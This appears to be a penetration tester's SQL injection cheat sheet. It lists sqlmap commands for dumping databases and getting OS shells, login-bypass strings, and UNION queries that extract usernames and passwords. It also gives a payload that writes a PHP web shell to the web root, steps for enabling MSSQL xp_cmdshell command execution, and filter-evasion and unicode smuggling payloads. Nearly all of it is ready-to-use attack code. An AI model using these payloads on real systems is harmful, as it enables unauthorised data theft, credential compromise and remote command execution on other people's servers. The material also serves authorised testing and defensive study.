# SQL injection

## SQL MAP

### From request

```sh
sqlmap -r REQUEST_FILE --dbs
```

### Basic info

Get database username, name, and hostname

```sh
sqlmap -u TARGET_URL --current-user --current-db --hostname
```

### From URL

Enumerate databases

```sh
sqlmap -u TARGET_URL --dbs
```

List tables for one database

```sh
sqlmap -u TARGET_URL --dbms=MySQL -D DATABASE_NAME --tables
```

Dump table content for one table

```sh
sqlmap -u TARGET_URL --dbms=MySQL -D DATABASE_NAME -T TABLE_NAME --dump

sqlmap -u TARGET_URL --dbs
sqlmap -u TARGET_URL --dbms=MySQL -D DataBaseName --tables
sqlmap -u TARGET_URL --dbms=MySQL -D DataBaseName -T TableName --dump
```

### Execute SQL Query

```sh
sqlmap -u TARGET_URL --dbms=MySQL --sql-query=SQL_QUERY
```

Interactive mode:

```sh
sqlmap -u TARGET_URL --dbms=MySQL --sqlmap-shell
```

### Check for waf

```sh
sqlmap -u URL --identify-waf --random-agent
```

### PWN

```sh
sqlmap -u URL --dbms=MySQL --os-pwn
sqlmap -u URL --dbms=MySQL --os-shell 
```

## Login Bypass

```text
USERNAME:   ' or 1/*  
PASSWORD:   */ =1 --  
```

```text
USERNAME: admin' or 'a'='a  
PASSWORD '#  
```

## Enumeration database

1. Test to found vuln

    ```sql
    1' AND '1'='0
    1' AND '1'='1
    1" AND "1"="0
    1" AND "1"="1
    1 AND 1=0
    1 AND 1=1
    ```

2. Confirm number of columns

    ```sql
    ORDER BY 1 --
    ...
    ORDER BY 4 --
    ```

3. Find which column will display info

    ```sql
    UNION SELECT 1,2,3,4 --
    ```

4. Find database name, user name, and version (must use group_concat for one liner)

    ```sql
    UNION SELECT (SELECT group_concat(database(),0x3a,user(),0x3a,version())),2,3,4 --
    ```

5. Find tables name

    ```sql
    UNION SELECT (SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema="DATABASE_NAME" LIMIT 1 OFFSET 0),2,3,4 -

    UNION SELECT (SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET 0),2,3,4 --
    ```

6. Find columns name

    ```sql  
    UNION SELECT (SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='Table_Name'),2,3,4 --
    ```

7. Dump data from the table

    ```sql  
    UNION SELECT (SELECT group_concat(id,0x3A,username,0x3A, password) from Table_Name)),2,3,4 --
    ```

## Drop webshell

```sql
union all select "<?php echo shell_exec($_REQUEST['cmd']);?>",2,3,4,5,6 into OUTFILE '/var/www/html/shell.php' --
```

### MSSQL Enumeration: Error based

<https://www.exploit-db.com/papers/12975/>

Enumerate column and table name

```sql
http://www.example.com/page.asp?id=1' HAVING 1=1--
Error message: Column 'news.news_id' is invalid			< table_name.column
```

```sql
http://www.example.com/page.asp?id=1' GROUP BY news.news_id HAVING 1=1--
Error message: Column 'news.news_author' is invalid		< table_name.column2
```

```sql
http://www.example.com/page.asp?id=1' GROUP BY news.news_id,news.news_author HAVING 1=1--
Error message: Column 'news.news_detail' is invalid		< table_name.column3
```

Until no error

Enumerate version, db name, users:

```sql
http://www.example.com/page.asp?id=1+and+1=convert(int,@@version)--
http://www.example.com/page.asp?id=1+and+1=convert(int,db_name())--
http://www.example.com/page.asp?id=1+and+1=convert(int,user_name())--       << Is the user running as dbo or sa?

xp_cmdshell << if running as database admin
http://www.example.com/news.asp?id=1; exec master.dbo.xp_cmdshell 'command'
'; exec master.dbo.xp_cmdshell 'command'
```

On MSSQL 2005 you may need to reactivate xp_cmdshell first as it's disabled by default:

```sql
EXEC sp_configure 'show advanced options', 1;--
RECONFIGURE;-- 
EXEC sp_configure 'xp_cmdshell', 1;-- 
RECONFIGURE;--  
```

On MSSQL 2000:

```sql
EXEC sp_addextendedproc 'xp_anyname', 'xp_log70.dll';--
```

## SQL filter bypass

Beyond SQLi: Obfuscate and Bypass - <https://www.exploit-db.com/papers/17934/>

```sql
AND, OR operators
AND = &&
OR = ||
```

Comment operator << Mysql

```sql
--
#  
/**/  
```

```sql
Regular expression
It is common that PHPIDS will block operators such as =, ', (), 
table_name = 'users' X
table_name between 'a' and 'z' X
table_name between char(97) and char(122) X

Convert strings to HEX format.
table_name between 0x61 and 0x7a
table_name like 0x7573657273

Change case
union > UniOn
select > SeLect

Inline comments << Mysql 5.0
/*! <sql operator> */
```

### > PHP/5.2.4 unicode SQL Smuggling

> Payload

```sql
%c0'^0--%20
%ff'<>1#
```

<https://owasp.org/www-pdf-archive/OWASP_IL_2007_SQL_Smuggling.pdf>
